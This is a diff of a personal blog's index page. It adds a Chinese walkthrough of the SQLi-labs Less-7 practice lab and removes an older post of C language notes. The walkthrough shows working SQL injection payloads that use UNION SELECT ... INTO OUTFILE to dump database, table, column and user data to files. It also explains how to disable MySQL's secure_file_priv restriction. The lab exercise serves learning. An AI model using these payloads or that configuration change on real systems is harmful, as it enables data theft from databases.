@@ -64,6 +64,93 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-blog g" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/29/blog%20g/" class="article-date">
+  <time datetime="2020-11-29T08:49:29.000Z" itemprop="datePublished">2020-11-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/29/blog%20g/">lesson7</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="一-预备"><a href="#一-预备" class="headerlink" title="一.预备"></a>一.预备</h4><p>1.利用load_flie()函数导出文件：</p>
+<p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 </p>
+<p>注.使用条件：</p>
+<p>a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。</p>
+<p>b.欲读取文件必须在服务器上。</p>
+<p>c.必须指定文件完整的路径。</p>
+<p>d.欲读取文件必须小于 max_allowed_packet。</p>
+<h4 id="二-lesson7实战"><a href="#二-lesson7实战" class="headerlink" title="二.lesson7实战"></a>二.lesson7实战</h4><h5 id="A-查找注入点："><a href="#A-查找注入点：" class="headerlink" title="A.查找注入点："></a>A.查找注入点：</h5><p>查询源代码——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * from users where id&#x3D;((&#39;$id&#39;)) limit 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以得知注入类型为：’))</p>
+<p>构造语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;)) or 1&#x3D;1--+;</span><br></pre></td></tr></table></figure>
+
+<p>返回正常。</p>
+<h5 id="B1-数据库中导出文件"><a href="#B1-数据库中导出文件" class="headerlink" title="B1.数据库中导出文件"></a>B1.数据库中导出文件</h5><p>遇到问题：输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>在指定目录下未生成相应名为“1”的文件</p>
+<p>由前人指点：mysql最初对文件的导入和导出有限制，因此应当先取消该限制</p>
+<p>在mysql数据库中执行语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>发现本地value的值为NULL。NULL表示禁止。即禁止将产生的文件导入mysql目录下（注：如果这里value值有文件夹目录，则表示只允许该目录下文件。如果为空，则表示不限制目录。）</p>
+<p>既然问题找到了，那就解决它——去掉导入目录的限制：在mysql配置文件my.ini中加入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv &#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>然后重启mysql，在执行上述语句则在指定目录下找到指定文件。</p>
+<p>由于我们刚刚没有规定产生的文件导出到哪里，因此在导出文件时要表明目录地址。</p>
+<p>在mysql数据库中输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>则可在指定目录下找到该文件，得到users的全部内容。（注文件一定要是导出目录下不存在的新名字文件）</p>
+<h5 id="B2-在B1的操作之后就可以开始常规流程："><a href="#B2-在B1的操作之后就可以开始常规流程：" class="headerlink" title="B2.在B1的操作之后就可以开始常规流程："></a>B2.在B1的操作之后就可以开始常规流程：</h5><p>1.爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开1.txt的文件可以发现里面包含数据库名</p>
+<p>2.爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开2.txt的文件可以发现里面包含库名为security下的所有表的表名</p>
+<p>3.爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\3.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开3.txt的文件可以发现里面包含库名为security下表名为usesr的列的所有列名</p>
+<p>4.爆值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\4.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开4.txt的文件可以发现里面包含库名为security下表名为usesr的所有数据值。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/29/blog%20g/" data-id="ckkrqc5c8000in4vue2hddpuc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-blog f" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/28/blog%20f/" class="article-date">
@@ -564,65 +651,6 @@
 
 
   
-    <article id="post-blog4" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/10/22/blog4/" class="article-date">
-  <time datetime="2020-10-22T13:19:02.000Z" itemprop="datePublished">2020-10-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/10/22/blog4/">第四章汇总（1）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一.   一维数组</p>
-<p>1.a 数组名不能与变量名一样；b 可以在定义变量名的同时定义数组；</p>
-<p>​            c  “[]”中的数据只能是整型常量，不能是变量，且若为整型常量即可在其中加减；</p>
-<p>​            d  数组下标是从0开始的，且数组最后一个元素的下标为该数组元素个数减一；</p>
-<p>​            e  C语言中只能逐个使用数组中的元素，不能一次性引用多个元素，如：a[2]=1，意为将1的值赋值给该数组的第二个元素；</p>
-<p>​            f  若未给数组中元素赋值，则其输出结果为不确定值；</p>
-<p>​            g 当所赋初值个数多余该数组的元素个数时，在编译时出错，无结果；当所赋初值个数少于该数组的元素个数时，会自动给未赋值的元素赋值为0。</p>
-<ol start="2">
-<li><p>a 产生随机数：利用rand()函数，其原型为int rand(void)。要产生[n,m]范围内随机整数，要利用公式(int)(n+(m-n)*rand()/RAND_MAX)</p>
-<p>b  初始化随机数发生器：srand()，其函数原型为void srand(unsigned int seed)。seed是随机数种子，为了产生不可预见的随机数，通常用time(0)返回的值作为随机种子。而函数time(0)包含在头文件&lt;time.h&gt;中。</p>
-</li>
-</ol>
-<p>二.   二维数组</p>
-<ol>
-<li>初始化二维数组时，可省略第一维的长度，但第二维长度不能忽略。</li>
-<li>按顺序赋值并且省略第一维的长度时，数组第一维的大小按以下规则决定。设有n个初值数据，第二维长度为m，由于可能只对部分数据赋值，n/m不一定会被整除，因此第一维的大小通常为(int)(n/m+1).</li>
-<li>矩阵转置：将一个二维数组的行和列元素进行互换。即将二维数组a中的第i行第j列元素赋给二位数组b中的第j行第i列。</li>
-</ol>
-<p>三.字符串函数</p>
-<p>strcmp(字符串1,字符串2)</p>
-<p>用法：两个字符串自左向右一个个比对，直到出现不同的字符或遇到‘\0’为止。（若字符串第一个字符比对就不同，那么即停止比对）。函数的返回值——a.若字符串1=字符串2，那么返回值为0；b.若字符串1&gt;字符串2，那么返回值为正整数；c.若字符串1&lt;字符串2，那么返回值为负整数。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/22/blog4/" data-id="ckkrqc5ce000vn4vu31shhhro" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -673,7 +701,11 @@
       <ul>
         
           <li>
-            <a href="/2021/02/06/lesson38/">lesson38</a>
+            <a href="/2021/02/07/lesson46/">lesson46</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/06/lesson38-45/">lesson38-45</a>
           </li>
         
           <li>
@@ -686,10 +718,6 @@
         
           <li>
             <a href="/2021/02/04/lesson25-28a/">lesson25-28a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/03/lesson24/">lesson24</a>
           </li>
         
       </ul>
